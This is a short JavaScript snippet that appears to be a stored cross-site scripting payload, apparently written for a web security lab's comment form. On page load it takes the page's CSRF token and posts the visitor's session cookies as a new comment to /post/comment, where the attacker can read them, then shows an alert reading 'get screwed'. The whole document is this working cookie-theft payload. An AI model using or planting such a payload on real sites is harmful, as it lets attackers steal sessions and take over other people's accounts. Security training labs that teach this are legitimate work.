window.addEventListener('DOMContentLoaded',() => {const csrf = document.getElementsByName("csrf")[0].attributes['value'].value;let body={csrf,"email": "l@e", "name": "name", "comment": document.cookie, "postId": 2, "website": ''};body = new URLSearchParams(Object.entries(body)).toString();fetch("/post/comment", {"method": "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, body}).then(() => alert('get screwed'))})
